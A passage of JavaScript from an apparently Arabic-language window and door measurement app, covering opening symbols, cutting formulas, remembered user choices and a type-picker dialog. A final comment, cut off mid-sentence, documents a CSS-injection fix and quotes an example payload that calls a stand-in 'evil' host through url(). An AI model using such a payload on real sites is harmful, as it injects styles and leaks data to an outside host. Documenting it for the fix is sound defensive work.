      return `<svg xmlns="http://www.w3.org/2000/svg" width="80" height="64" viewBox="0 0 80 64"><g fill="none" stroke="#18647a" stroke-width="2">${kind==='door'||kind==='door2'?'<path d="M8 54V8H72V54"/>':'<rect x="8" y="8" width="64" height="46" rx="1"/>'}${partition}${leaf}</g><text x="40" y="63" text-anchor="middle" font-size="7" fill="#365769">${kind === 'window' ? 'W' : 'D'}</text></svg>`;
    }
    function wsSymbolUrl(key) { const svg = wsSymbolSvg(key); return svg ? 'data:image/svg+xml,' + encodeURIComponent(svg) : ''; }
    function wsPreviewFormulaSymbol() {
      const key = (document.getElementById('wsFormulaPreset') || {}).value || '';
      const target = document.getElementById('wsFormulaPreview'); if (!target) return;
      target.textContent = key ? WS_OPENING_SYMBOLS[key][0] + ' — يُعرض الرمز مكان الرسم إن لم ترسم يدوياً.' : 'يمكن تركه فارغاً، ولا يغيّر حساب الأمتار.';
    }
    window.wsPreviewFormulaSymbol = wsPreviewFormulaSymbol;
    // v330: use the cutting operation IDs, including newly saved/imported operations.
    const WS_CUT_NAMES = {
      'window_double': 'نافذة ضلفتين',
      'window_single': 'نافذة ضلفة واحدة',
      'window_double_top': 'نافذة ضلفتين مع تابت',
      'window_flipper': 'نافذة قلاب وتابت',
      'window_leaf_fixed': 'نافذة ضلفة وتابت',
      'aluminum_sliding_normal': 'نافذة المونيوم سحاب عادي',
      'aluminum_67': 'نافذة المونيوم سحاب ضلفتين نظام 67',
      'aluminum_door': 'باب المونيوم',
      'aluminum_door_double': 'باب المونيوم ضلفتين',
      'aluminum_window_double': 'نافذة المونيوم ضلفتين',
      'aluminum_window_single': 'نافذة المونيوم ضلفة واحدة',
      'aluminum_window_flipper': 'نافذة المونيوم قلاب',
      'aluminum_window_leaf_fixed': 'نافذة المونيوم ضلفة وثابت',
      'aluminum_window_flipper_fixed': 'نافذة المونيوم قلاب وثابت (معكوسة)',
      'aluminum_sliding_67': 'نافذة المونيوم سحاب ضلفتين نظام 67',
      'door_single': 'باب ضلفة واحدة',
      'door_double': 'باب ضلفتين',
      'sliding_poly_one': 'سحاب بولي ون',
      'sliding_poplist': 'سحاب بوبلست',
      'sranti_external_large': 'سرانتي خارجي كبير',
      'sranti_external_small': 'سرانتي خارجي صغير',
      'sranti_normal': 'سرانتي عادي'
    };
    function wsFormulaFamily(key, name) {
      const n = String(name || '').toLowerCase().replace(/[أإآ]/g, 'ا').replace(/ى/g, 'ي');
      if (/aluminum/.test(key) || /ال[وي]?منيوم|المونيوم|الومنيوم|alumin/.test(n)) return 'xtype_alum';
      if (/sranti_external/.test(key) || (/سرانتي/.test(n) && /خارجي/.test(n))) return 'xtype_ser_out';
      if (key === 'sranti_normal' || /سرانتي.*عادي/.test(n)) return 'xtype_ser_normal';
      if (/^sliding_/.test(key) || (/سحاب|sliding/.test(n) && /pvc|بي في سي|بيفي سي|بولي|بوبلست/.test(n))) return 'xtype_pvc_slide';
      if (/^(window_|door_)/.test(key) || /pvc|بي في سي|بيفي سي/.test(n)) return 'pvc';
      return '';
    }
    function wsCutOptions(type) {
      let registry = {}, profiles = {};
      try { registry = JSON.parse(localStorage.getItem('app_custom_types') || '{}') || {}; } catch(e) {}
      try { profiles = JSON.parse(localStorage.getItem('app_custom_profiles') || '{}') || {}; } catch(e) {}
      const names = Object.assign({}, WS_CUT_NAMES, registry);
      const keys = new Set(Object.keys(WS_CUT_NAMES));
      Object.values(profiles).forEach(p => { if(p && typeof p === 'object') Object.keys(p).forEach(k => keys.add(k)); });
      const familyType=window.WSSystems?.get(type)?.baseMaterial||type;
      let activeProfile=profiles[window.WSSystems?.get(type)?.cutProfile||'الافتراضي'];if(window.WSEngine&&activeProfile)try{activeProfile=window.WSEngine.resolveProfile({cutProfiles:profiles,workshopOptions:window.WSStudio.options()},window.WSSystems?.get(type)?.cutProfile||'الافتراضي');Object.keys(activeProfile).forEach(k=>keys.add(k));}catch(e){}
      const bound=window.WSSymbolFormulas?window.WSSymbolFormulas.all().filter(d=>d.material===type).map(d=>({key:d.key,name:d.name})):[];
      return bound.concat(Array.from(keys).filter(k => (!activeProfile||Object.hasOwn(activeProfile,k))&&typeof names[k] === 'string' && (wsFormulaFamily(k, names[k]) === familyType||(k.startsWith('custom_')&&!k.startsWith('custom_symbol_')&&profiles[window.WSSystems?.get(type)?.cutProfile||'الافتراضي']?.[k])))
        .map(key => ({key, name:names[key]}))).filter((x,i,a)=>a.findIndex(y=>y.key===x.key)===i);
    }
    function wsNeedsDirection(key, name) {
      const text=String(name||'');
      if (/قلاب|flipper|tilt/i.test(text+' '+String(key||''))) return false;
      if (/ضلفتين|ضلفتان|ضلفات|(?:[2-9٢-٩])\s*ضلفة/.test(text)) return false;
      return /ضلفة/.test(text)||/^(?:window_single|door_single|aluminum_window_single|aluminum_door|window_leaf_fixed|aluminum_window_leaf_fixed)$/.test(key||'')||/^باب(?:\s|$)/.test(text);
    }
    function wsAskOpeningDirection(choice, choose) {
      const dialog=document.createElement('dialog');dialog.dir='rtl';
      dialog.setAttribute('aria-label','اختر اتجاه فتح الضلفة');
      dialog.style.cssText='border:0;border-radius:18px;padding:24px;max-width:90vw;font-family:inherit;z-index:10000';
      const title=document.createElement('h3');title.textContent='اختر اتجاه فتح الضلفة';
      const help=document.createElement('p');help.textContent='الاتجاه حسب جهة المفصلات عند النظر إلى الرمز';
      dialog.append(title,help);
      ['right','left'].forEach(side=>{
        const button=document.createElement('button');button.type='button';button.className='tp-btn';
        button.textContent=side==='right'?'يمين — المفصلات يمين':'يسار — المفصلات يسار';
        button.style.cssText='min-height:60px;min-width:130px;margin:6px;font-size:18px';
        button.onclick=()=>{dialog.close();dialog.remove();choose(side);};dialog.append(button);
      });
      const cancel=document.createElement('button');cancel.type='button';cancel.className='tp-btn';cancel.textContent='إلغاء';
      cancel.onclick=()=>{dialog.close();dialog.remove();};dialog.append(cancel);
      dialog.addEventListener('cancel',()=>dialog.remove());document.body.append(dialog);dialog.showModal();
    }
    // v332: illustration cards choose the operation and hinge side atomically.
    const WS_FORMULA_PHOTOS = Object.freeze({
      window_double:'window-double', window_single:'window-single',
      window_double_top:'window-three', window_flipper:'window-tilt', window_leaf_fixed:'window-fixed',
      door_single:'door-single', door_double:'door-double',
      sliding_poly_one:'window-slide', sliding_poplist:'window-slide',
      sranti_external_large:'shutter-large', sranti_external_small:'shutter-small', sranti_normal:'shutter-normal',
      aluminum_window_double:'window-double', aluminum_window_single:'window-single',
      aluminum_window_flipper:'window-tilt-single', aluminum_window_leaf_fixed:'window-fixed',
      aluminum_window_flipper_fixed:'window-tilt', aluminum_door:'door-single', aluminum_door_double:'door-double',
      aluminum_sliding_normal:'window-slide', aluminum_67:'window-slide', aluminum_sliding_67:'window-slide'
    });
    function wsFormulaPhoto(key, name) {
      if (Object.prototype.hasOwnProperty.call(WS_FORMULA_PHOTOS, key)) return WS_FORMULA_PHOTOS[key];
      const n = String(name || '');
      if (/سرانتي/.test(n)) return /خارجي/.test(n) ? (/صغير/.test(n) ? 'shutter-small' : 'shutter-large') : 'shutter-normal';
      if (/سحاب|sliding/i.test(n)) return 'window-slide';
      if (/باب/.test(n)) return /ضلفتين/.test(n) ? 'door-double' : 'door-single';
      if (/قلاب/.test(n)) return /ثابت|تابت/.test(n) ? 'window-tilt' : 'window-tilt-single';
      if (/ثابت|تابت/.test(n)) return 'window-fixed';
      if (/ضلفتين/.test(n)) return 'window-double';
      return 'window-single';
    }
    function wsFormulaCards(option) {
      const directional = wsNeedsDirection(option.key, option.name) || option.key === 'aluminum_door';
      return (directional ? ['right', 'left'] : ['']).map(side => ({
        key:option.key, label:option.name, side,
        title:option.name + (side ? ' — ' + (side === 'right' ? 'يمين' : 'يسار') : ''),
        photo:wsFormulaPhoto(option.key, option.name)
      }));
    }
    function wsFormulaImageHtml(key, label, side) {
      if (!key) return '';
      return '<img class="ws-formula-thumb" src="assets/formulas/' + wsFormulaPhoto(key, label) + '.svg" alt="' + escHtml(label || 'معادلة المقاس') + '" style="width:52px;height:52px;object-fit:contain;' + (side === 'left' ? 'transform:scaleX(-1);' : '') + '">';
    }
    // Confirmed manual selections only; local and isolated by signed-in user.
    function wsLearningKey(){
      const uid=typeof currentUserUid==='function'?currentUserUid():'';
      return uid?'ws_measurement_choices_v1:'+uid:'';
    }
    function wsLearningRows(){
      try{const key=wsLearningKey();if(!key)return [];const rows=JSON.parse(localStorage.getItem(key)||'[]');return Array.isArray(rows)?rows.filter(r=>r&&r.choice&&Number.isFinite(r.w)&&Number.isFinite(r.h)&&Number.isFinite(r.count)&&Number.isFinite(r.at)).slice(-500):[];}catch(e){return [];}
    }
    function wsRememberChoice(material,w,h,choice){
      if(window.WSStudio?.options().learning.enabled===false)return;
      if(!choice||!choice.learn||(!choice.key&&!choice.symbol))return;
      w=wsNum(w);h=wsNum(h);const key=wsLearningKey();if(!key||!(w>0&&h>0))return;
      const selected={key:choice.key||'',label:choice.label||'',symbol:choice.symbol||'',symbolLabel:choice.symbolLabel||'',side:choice.side||'',layout:choice.layout||''};
      const rows=wsLearningRows(),same=rows.find(r=>r.material===material&&r.w===w&&r.h===h&&JSON.stringify(r.choice)===JSON.stringify(selected));
      if(same){same.count=Math.min(1000,same.count+1);same.at=Date.now();}
      else rows.push({material,w,h,choice:selected,count:1,at:Date.now()});
      rows.sort((a,b)=>a.at-b.at);
      try{localStorage.setItem(key,JSON.stringify(rows.slice(-500)));}catch(e){}
    }
    function wsLearnedChoices(material,w,h,opts){
      if(!(w>0&&h>0))return [];
      const learning=window.WSStudio?.options().learning||{enabled:true,tolerance:10,limit:6};if(!learning.enabled)return [];
      const groups=new Map();
      wsLearningRows().filter(r=>r.material===material&&Math.abs(r.w-w)<=learning.tolerance&&Math.abs(r.h-h)<=learning.tolerance&&
        (!r.choice.key||opts.some(o=>o.key===r.choice.key))&&(!r.choice.symbol||window.WSOpeningSymbols.get(r.choice.symbol))).forEach(r=>{
        const key=JSON.stringify([r.choice.key,r.choice.symbol,r.choice.side,r.choice.layout]);
        const distance=Math.abs(r.w-w)+Math.abs(r.h-h),prev=groups.get(key);
        if(!prev)groups.set(key,{...r,distance});
        else{prev.count+=r.count;if(distance<prev.distance){prev.w=r.w;prev.h=r.h;prev.distance=distance;}prev.at=Math.max(prev.at,r.at);}
      });
      return Array.from(groups.values()).sort((a,b)=>b.count-a.count||a.distance-b.distance||b.at-a.at).slice(0,learning.limit);
    }
    function wsLearnedChoice(material,w,h,opts){return wsLearnedChoices(material,w,h,opts)[0]||null;}
    // Recommendations reorder choices; never select a formula or change area rules.
    function wsDimensionAdvice(w,h) {
      const a=window.WSStudio?.options().advice||{doorHeight:200,doorWidth:105,narrowWidth:60,narrowMinHeight:80,narrowMaxHeight:160,smallSize:70,doubleMinWidth:80,doubleMaxWidth:120,doubleMaxHeight:150,wideWidth:120,wideMinHeight:80};
      if(!(w>0&&h>0))return {order:[],reason:''};
      if(h>a.doorHeight) return w<a.doorWidth?{order:['door-single','door-double','door-fixed'],reason:'وفق حدود الباب المفرد في الإعدادات: الباب المفرد أولاً'}
        :w>a.doorWidth?{order:['door-double','door-fixed','door-single'],reason:'وفق حدود الباب المزدوج في الإعدادات: باب ضلفتين أو باب وثابت'}
        :{order:['door-single','door-double','door-fixed'],reason:'عرض عند الحد الفاصل: حد مشترك بين الباب المفرد والمزدوج؛ راجع الاستخدام'};
      if(w<a.narrowWidth&&h>=a.narrowMinHeight&&h<=a.narrowMaxHeight)return {order:['window-single','leaf-fixed','leaf-tilt','tilt','tilt-fixed'],splitWindowDirection:true,reason:'نافذة ضيقة: ضلفة واحدة أولاً — اختر المفصلات يمين أو يسار حسب الموقع'};
      if(w<a.smallSize||h<a.smallSize)return {order:['window-single','leaf-fixed','leaf-tilt','tilt','tilt-fixed'],reason:'نافذة صغيرة: ضلفة واحدة، ضلفة وثابت، ضلفة وقلاب، أو قلاب'};
      if(w>=a.doubleMinWidth&&w<=a.doubleMaxWidth&&h<a.doubleMaxHeight)return {order:['window-double','window-single','leaf-fixed','tilt','tilt-fixed'],reason:'وفق حدود النافذة المزدوجة في الإعدادات: نافذة ضلفتين أولاً'};
      if(w>a.wideWidth&&h>a.wideMinHeight)return {order:['two-center-fixed','two-side-fixed','two-three-fixed','sliding','window-double'],reason:'وفق حدود الفتحات الواسعة في الإعدادات: تقسيمات بضلفتين وثوابت أو سحاب'};
      return {order:[],reason:'كل الأشكال متاحة؛ اختر حسب الاستخدام والتقسيم'};
    }
    function wsChoiceKind(c) {
      const id=c.symbol||c.key||'',name=c.title||c.name||'';
      if(id==='door-fixed')return 'door-fixed';
      if(id==='leaf-tilt'||(/ضلفة/.test(name)&&/قلاب/.test(name)))return 'leaf-tilt';
      if(/^door-two|door_double|aluminum_door_double/.test(id))return 'door-double';
      if(/^door-|door_single|aluminum_door$/.test(id))return 'door-single';
      if(/sliding|aluminum_67/.test(id)||/سحاب/.test(name))return 'sliding';
      if(['two-center-fixed','two-side-fixed','two-three-fixed'].includes(id))return id;
      if(id==='window_double_top')return 'two-center-fixed';
      if(/leaf.fixed/.test(id))return 'leaf-fixed';
      if(id==='tilt-fixed'||/flipper_fixed|^window_flipper$/.test(id))return 'tilt-fixed';
      if(id==='tilt-single'||/flipper/.test(id))return 'tilt';
      if(id==='window-double'||/window_double/.test(id))return 'window-double';
      if(/^window-(right|left)$|window_single/.test(id))return 'window-single';
      if(/باب/.test(name))return /ثابت|تابت/.test(name)?'door-fixed':/ضلفتين/.test(name)?'door-double':'door-single';
      if(/قلاب/.test(name))return /ثابت|تابت/.test(name)?'tilt-fixed':'tilt';
      if(/ضلفتين/.test(name))return /ثابت|تابت/.test(name)?'two-center-fixed':'window-double';
      if(/ثابت|تابت/.test(name))return 'leaf-fixed';
      if(/ضلفة واحدة/.test(name))return 'window-single';
      return '';
    }
    function wsAdviceRank(choice,advice){
      const kind=wsChoiceKind(choice),i=advice.order.indexOf(kind);
      if(i<0)return 100;
      // Within suggested sliding operations, prefer aluminium system 67.
      return i+(kind==='sliding'&&choice.key==='aluminum_sliding_normal'?0.1:0);
    }
    function wsRenderFormulaChoices() {
      const ov = document.getElementById('typePickerOverlay'); if (!ov) return;
      ov.querySelectorAll('.tp-cb').forEach(cb => {
        const wrapper = cb.closest('.ws-type-option'), box = wrapper.querySelector('.ws-formula-choice');
        wrapper.classList.toggle('ws-type-expanded', cb.checked); box.hidden = !cb.checked;
        if (!cb.checked || box.dataset.ready) return;
        const opts = wsCutOptions(cb.value); if((window.WSSystems?.get(cb.value)?.baseMaterial||cb.value)==='pvc')opts.push(...wsCutOptions('xtype_pvc_slide')); box.dataset.ready = '1';
        const kitchen=(window.WSSystems?.get(cb.value)?.baseMaterial||cb.value)==='xtype_kitchen_skirt';
        const common = cb.value === 'pvc' || cb.value === 'xtype_alum' || kitchen || !!window.WSSystems?.get(cb.value);
        const advice=common&&!kitchen?wsDimensionAdvice(wsNum((document.getElementById('pw')||{}).value),wsNum((document.getElementById('ph')||{}).value)):{order:[],reason:''};
        const learnedList=wsLearnedChoices(cb.value,wsNum((document.getElementById('pw')||{}).value),wsNum((document.getElementById('ph')||{}).value),opts);
        const learned=learnedList[0]||null;
        const preferred=learned&&learned.choice;
        const learnedKeyRank=key=>{const i=learnedList.findIndex(r=>r.choice.key===key);return i<0?100:i;};
        opts.sort((a,b)=>learnedKeyRank(a.key)-learnedKeyRank(b.key)||wsAdviceRank(a,advice)-wsAdviceRank(b,advice));
        const hint = document.createElement('p'); hint.className = 'ws-photo-hint';
        hint.textContent = (learned?'الأقرب لاختياراتك: استُخدم الاقتراح الأول '+learned.count+' مرة؛ فرق المقاس '+learned.distance+' سم إجمالاً — ':'')+(advice.reason?advice.reason+' — ':'')+'اقتراح ترتيب فقط؛ راجع الاستخدام. الرمز والمعادلة اختياريان.';
        const formula = document.createElement('select'); formula.className = 'ws-optional-formula';
        formula.setAttribute('aria-label','معادلة القص — اختياري');
        formula.add(new Option('بدون معادلة الآن — اختيار اختياري', ''));
        opts.forEach(o => formula.add(new Option(o.name,o.key)));
        const grid = document.createElement('div'); grid.className = 'ws-formula-grid';
        grid.setAttribute('role','group'); grid.setAttribute('aria-label','اختيار الرمز');
        const editSymbol=document.createElement('button');editSymbol.type='button';editSymbol.className='tp-btn';editSymbol.disabled=true;editSymbol.textContent='اختر رمزًا لإضافة معادلته';
        const status = document.createElement('div'); status.className = 'ws-formula-status'; status.setAttribute('aria-live','polite');
        const updateStatus = () => {
          const c=box.wsFormulaChoice;
          editSymbol.disabled=!c?.symbol;editSymbol.textContent=c?.symbol?(window.WSSymbolFormulas?.get(cb.value,c.symbol)?'تعديل معادلة هذا الرمز':'إضافة معادلة لهذا الرمز'):'اختر رمزًا لإضافة معادلته';
          status.textContent = c ? '✓ '+(c.symbolLabel || c.label || 'بدون رمز')+(c.key ? ' — '+c.label : ' — بدون معادلة') : 'يمكن إضافة المقاس دون رمز أو معادلة';
        };
        const symbolChoice = id => {
          const symbol=window.WSOpeningSymbols.get(id);
          const binding=window.WSSymbolFormulas?.get(cb.value,id);
          const base=window.WSSystems?.get(cb.value)?.baseMaterial||cb.value;
          const candidate=binding?binding.key:base==='pvc'?symbol.pvc:base==='xtype_alum'?symbol.alum:'';
          const key=opts.some(o=>o.key===candidate)?candidate:'';
          const option=opts.find(o=>o.key===key);
          return {key:option?key:'',label:option?option.name:'',side:symbol.side,
            title:symbol.label,symbolLabel:symbol.label,symbol:symbol.id,layout:symbol.layout};
        };
        // One card per shape; direction/layout remain explicit saved variants.
        const groups=[
          ['باب ضلفة واحدة — يمين',['door-right']],['باب ضلفة واحدة — يسار',['door-left']],
          ['نافذة ضلفة واحدة — يمين',['window-right']],['نافذة ضلفة واحدة — يسار',['window-left']],
          ['نافذة قلاب',['tilt-single']],
          ['قلاب مع ثابت أسفل',['tilt-fixed']],
          ['باب ضلفتين',['door-two-equal','door-two-large-right','door-two-large-left']],
          ['نافذة ضلفتين',['window-double']],
          ['باب ضلفة وثابت',['door-fixed']],
          ['ضلفة مع ثابت',['leaf-fixed']],
          ['ضلفة وقلاب أعلى',['leaf-tilt']],
          ['ضلفتان وثابت وسط',['two-center-fixed']],
          ['ضلفتان وثابتان جانبيان',['two-side-fixed']],
          ['ضلفتان وثلاثة ثوابت',['two-three-fixed']],
          ['ضلفتان أعلى وثابت أسفل',['two-top-fixed-bottom']],
          ['ثابت أعلى وضلفتان أسفل',['fixed-top-two-bottom']]
        ];
        const usedIds=new Set(groups.flatMap(g=>g[1]));
        if(kitchen){groups.length=0;}
        window.WSOpeningSymbols.catalog.filter(x=>kitchen?x.group==='kitchen':x.group!=='kitchen'&&!usedIds.has(x.id)&&!window.WSOpeningSymbols.get(x.id+'-opening-right')).forEach(x=>groups.push([x.label,[x.id]]));
        let cards=common?groups.map(([title,ids])=>({...symbolChoice(ids[0]),title,variants:ids.map(symbolChoice)}))
          .concat(opts.filter(o=>!o.key.startsWith('custom_symbol_')&&(wsChoiceKind(o)==='sliding'||!Object.prototype.hasOwnProperty.call(WS_CUT_NAMES,o.key))).flatMap(wsFormulaCards)):opts.flatMap(wsFormulaCards);
        cards=cards.flatMap(c=>window.WSOpeningSymbols.get(c.symbol+'-opening-right')?['right','left'].map(side=>symbolChoice(c.symbol+'-opening-'+side)):c);
        cards=cards.flatMap(c=>c.variants&&c.variants.length>1?c.variants.map(v=>({...v,title:v.title||v.symbolLabel||v.label})):c);
        cards=cards.filter((c,i,a)=>a.findIndex(x=>x.symbol===c.symbol&&x.key===c.key&&x.side===c.side)===i);
        if(common)cards.sort((a,b)=>wsAdviceRank(a,advice)-wsAdviceRank(b,advice));
        const remembered=learnedList.map(r=>{
          const c=r.choice;
          return {...c,title:c.symbol?(window.WSOpeningSymbols.get(c.symbol)?.label||c.symbolLabel):c.label+(c.side==='left'?' — يسار':c.side==='right'?' — يمين':''),photo:wsFormulaPhoto(c.key,c.label),learned:true,uses:r.count};
        });
        const wasRemembered=c=>remembered.some(r=>r.symbol?c.symbol===r.symbol&&c.key===r.key:c.key===r.key&&c.side===r.side);
        cards=remembered.concat(cards.flatMap(card=>{
          if(card.variants){const variants=card.variants.filter(v=>!wasRemembered(v));return variants.length?[{...card,...variants[0],title:card.title,variants}]:[];}
          return wasRemembered(card)?[]:[card];
        }));
        const more=document.createElement('details');more.className='ws-more-symbols';
        const summary=document.createElement('summary');summary.textContent='أشكال إضافية';more.append(summary);
        const extraGrid=document.createElement('div');extraGrid.className='ws-formula-grid';more.append(extraGrid);
        const variants=document.createElement('select');variants.className='ws-symbol-variant';variants.hidden=true;
        variants.setAttribute('aria-label','اتجاه الفتح أو توزيع الضلف');
        let selectedCard=null;
        const applyChoice=(choice,button)=>{
          const binding=choice.symbol&&window.WSSymbolFormulas?.get(cb.value,choice.symbol);if(binding&&(!choice.key||choice.key===binding.key))choice={...choice,key:binding.key,label:binding.name};
          box.wsChoiceTouched=true;
          box.wsFormulaChoice={key:choice.key,label:choice.label,side:choice.side||'',symbol:choice.symbol||'',symbolLabel:choice.symbolLabel||'',layout:choice.layout||''};
          formula.value=choice.key;
          [...grid.querySelectorAll('button'),...extraGrid.querySelectorAll('button')].forEach(b=>b.setAttribute('aria-pressed',b===button?'true':'false'));
          updateStatus();
        };
        cards.forEach((initial,index)=>{
          const button=document.createElement('button');button.type='button';button.className='ws-formula-card';
          button.setAttribute('aria-pressed','false');button.setAttribute('aria-label',initial.title);button.dataset.symbolCategory=window.WSOpeningSymbols.get(initial.symbol)?.group||(/باب/.test(initial.title)?'doors':'windows');
          const img=document.createElement('img');
          img.src=initial.symbol?'assets/openings/'+initial.symbol+'.svg':'assets/formulas/'+initial.photo+'.svg';
          img.alt=initial.title;img.loading='lazy';img.decoding='async';
          if(!initial.symbol&&initial.side==='left')img.style.transform='scaleX(-1)';
          const caption=document.createElement('span');caption.textContent=initial.title;button.append(img,caption);
          if(initial.learned||wsAdviceRank(initial,advice)<100){const badge=document.createElement('small');badge.textContent=initial.learned?'استخدمته '+initial.uses+' مرة':'مقترح للمقاس';button.append(badge);}
          button.onclick=()=>{
            selectedCard=button;variants.innerHTML='';
            const choices=initial.variants||[initial];variants.hidden=choices.length<2;
            choices.forEach((c,i)=>variants.add(new Option(c.side?(c.side==='right'?'المفصلات يمين':'المفصلات يسار'):c.layout==='equal'?'ضلفتان متساويتان':c.layout==='large-right'?'الضلفة الكبيرة يمين':c.layout==='large-left'?'الضلفة الكبيرة يسار':c.title,String(i))));
            variants.value='0';
            variants.onchange=()=>{
              const choice=choices[Number(variants.value)]||choices[0];
              if(choice.symbol)img.src='assets/openings/'+choice.symbol+'.svg';
              img.alt=choice.title;applyChoice(choice,selectedCard);
            };
            img.src=initial.symbol?'assets/openings/'+initial.symbol+'.svg':img.src;
            applyChoice(choices[0],button);
          };
          (common&&index>=(window.WSEngine?.preferences(currentUserUid()).limit||6)?extraGrid:grid).appendChild(button);
          if((cb.value==='xtype_ser_normal'&&initial.key==='sranti_normal')||(cb.value==='xtype_ser_out'&&initial.key==='sranti_external_large')){button.onclick();box.wsChoiceTouched=false;}
        });
        formula.onchange=()=>{
          box.wsChoiceTouched=true;
          if(cb.value==='xtype_ser_out'&&!formula.value){for(const b of grid.querySelectorAll('button')){if(b.getAttribute('aria-label')==='سرانتي خارجي كبير'){b.onclick();return;}}formula.value='sranti_external_large';}
          const option=opts.find(o=>o.key===formula.value);
          const previous=box.wsFormulaChoice||{};
          box.wsFormulaChoice={...previous,key:option?option.key:'',label:option?option.name:'',side:previous.side||''};
          updateStatus();
        };
        const clear=document.createElement('button');clear.type='button';clear.className='tp-btn';clear.textContent=cb.value==='xtype_ser_out'?'الافتراضي: سرانتي خارجي كبير':'بدون رمز أو معادلة';
        clear.onclick=()=>{if(cb.value==='xtype_ser_out'){const b=grid.querySelectorAll('button');for(const item of b){if(item.getAttribute('aria-label')==='سرانتي خارجي كبير'){item.onclick();return;}}}variants.hidden=true;selectedCard=null;box.wsFormulaChoice=null;formula.value='';[...grid.querySelectorAll('button'),...extraGrid.querySelectorAll('button')].forEach(b=>b.setAttribute('aria-pressed','false'));updateStatus();};
        editSymbol.onclick=()=>{
          const current=box.wsFormulaChoice;if(!current?.symbol)return;
          window.WSSymbolFormulas.open(cb.value,current.symbol,d=>{
            const old=opts.find(o=>o.key===d.key);if(old)old.name=d.name;else{opts.push({key:d.key,name:d.name});formula.add(new Option(d.name,d.key));}
            box.wsFormulaChoice={...current,key:d.key,label:d.name};box.wsChoiceTouched=true;formula.value=d.key;updateStatus();
          });
        };
        const search=document.createElement('input');search.type='search';search.placeholder='ابحث عن رمز: فرن، أدراج، ثابت، قلاب…';search.setAttribute('aria-label','بحث الرموز');search.style.cssText='width:100%;margin:10px 0;padding:10px';
        const category=document.createElement('select');category.setAttribute('aria-label','تصنيف الرموز');category.innerHTML='<option value="">كل الرموز</option><option value="doors">أبواب</option><option value="windows">نوافذ</option><option value="partitions">قواطع</option><option value="facades">واجهات محلات</option><option value="balconies">بلكونات</option>';const filter=()=>{const q=search.value.trim();[...grid.querySelectorAll('button'),...extraGrid.querySelectorAll('button')].forEach(b=>{b.hidden=(!!q&&!b.getAttribute('aria-label').includes(q))||(!!category.value&&b.dataset.symbolCategory!==category.value);});if(q||category.value)more.open=true;};search.oninput=filter;category.onchange=filter;
        box.wsSetChoice=choice=>{box.wsFormulaChoice=choice;formula.value=choice.key||'';[...grid.querySelectorAll('button'),...extraGrid.querySelectorAll('button')].forEach(b=>b.setAttribute('aria-pressed',b.getAttribute('aria-label')===choice.symbolLabel?'true':'false'));updateStatus();};
        updateStatus();box.append(hint,clear);if(common)box.append(search,category);box.append(grid);if(common&&cards.length>(window.WSEngine?.preferences(currentUserUid()).limit||6))box.append(more);box.append(variants,formula,editSymbol,status);
      });
    }
    function wsReadFormulaChoices(ov) {
      const result={};
      for(const cb of ov.querySelectorAll('.tp-cb:checked')) {
        let choice=cb.closest('.ws-type-option').querySelector('.ws-formula-choice').wsFormulaChoice;
        if(cb.value==='xtype_ser_out'&&(!choice||!choice.key))choice={key:'sranti_external_large',label:WS_CUT_NAMES.sranti_external_large,side:''};
        if(choice) result[cb.value]={...choice,learn:cb.closest('.ws-type-option').querySelector('.ws-formula-choice').wsChoiceTouched===true};
      }
      return result;
    }
    function wsApplyFormula(row, choice) {
      if (!choice) return;
      row.cuttingFormula=choice.key||'';row.openingDirection=choice.side||'';
      row.cuttingProfile=window.WSSystems?.get(row.type)?.cutProfile||'';
      row.formulaSnapshot=window.WSStudio?.snapshot(row)||null;
      row.formulaLabel=choice.key ? choice.label+(choice.side?' — '+(choice.side==='right'?'يمين':'يسار'):'') : '';
      const symbol=window.WSOpeningSymbols.get(choice.symbol);
      if(symbol){row.cuttingSymbol=symbol.id;row.symbolLabel=choice.symbolLabel||symbol.label;row.leafLayout=symbol.layout||'';}
      const labels=Array.from(new Set([row.symbolLabel,row.formulaLabel].filter(Boolean)));
      row.note=[row.note,...labels].filter(Boolean).join(' — ');
      if(choice.side)row.openingSymbol=(/door/.test(choice.key)||/باب/.test(choice.label)?'door-':'window-')+choice.side;
      else if(choice.key==='window_double')row.openingSymbol='window-two';
    }
    function openTypePicker() {
      closeTypePicker();

      /* منتقي الأنواع يجب أن يكون مستقلاً عن حالة مربعات الإدخال أو cache
         الأنواع. القائمة الرئيسية المطلوبة ثابتة، لذلك نبنيها من
         PRIMARY_TYPE_MANIFEST أولاً ثم نأخذ اللون/الأيقونة/قواعد الحساب من
         التعريف المحفوظ إن وُجد. بهذه الطريقة لا يختفي نوع رئيسي لأن نسخة
         قديمة من measurementTypes ناقصة أو لأن getAllTypeDefs أعاد قائمة
         مختلفة على جهاز آخر. الأنواع المخصصة تُضاف بعد القائمة الرئيسية. */
      const saved = (typeof getExtraTypes === 'function' ? getExtraTypes() : []) || [];
      const custom = (typeof getCustomTypes === 'function' ? getCustomTypes() : []) || [];
      const savedById = {};
      saved.forEach(t => { if (t && t.id) savedById[t.id] = t; });

      const mandatory = Array.isArray(PRIMARY_TYPE_MANIFEST) ? PRIMARY_TYPE_MANIFEST.map(m => {
        const x = savedById[m.id] || {};
        return {
          id: m.id,
          name: m.name,
          color: x.color || m.color || '#6e7471',
          icon: x.icon || m.icon || 'fa-shapes'
        };
      }) : [];

      const mandatoryIds = new Set(mandatory.map(t => t.id));
      const customDefs = custom.map(t => ({
        id: t.id,
        name: t.name,
        color: t.color || '#6e7471',
        icon: t.icon || 'fa-shapes'
      })).filter(t => t.id && !mandatoryIds.has(t.id));

      const order=window.WSEngine?.preferences(currentUserUid()).typeOrder||[];
      const defs = mandatory.concat(customDefs).sort((a,b)=>(order.includes(a.id)?order.indexOf(a.id):999)-(order.includes(b.id)?order.indexOf(b.id):999));

      const w = (document.getElementById('pw') || {}).value || '';
      const h = (document.getElementById('ph') || {}).value || '';

      const ov = document.createElement('div');
      ov.id = 'typePickerOverlay';
      ov.className = 'tp-overlay';
      ov.onclick = e => { if (e.target === ov) closeTypePicker(); };
      ov.innerHTML =
        '<div class="tp-box" role="dialog" aria-label="اختر نوع المقاس">' +
          '<div class="tp-head">' +
            '<div class="tp-title">على أي نوع تضيف هذا المقاس؟</div>' +
            '<div class="tp-dim">' + escHtml(w) + ' × ' + escHtml(h) + '</div>' +
          '</div>' +
          '<div class="tp-hint">أشِّر نوعاً أو أكثر — يُضاف صف لكل نوع بنفس المقاس.</div>' +
          '<div class="tp-list">' +
            defs.map(d =>
              /* ⚠️ إصلاح 8.8.5 — escAttr في سياق CSS لا تحمي.
                 هي تهرّب محارف HTML، و**لا محرف HTML واحد** في حمولة مثل
                     red;background:url(https://evil/?x=1)
                 فتمرّ كما هي وتُحقن قاعدة CSS جديدة. و url() تُرسل طلباً
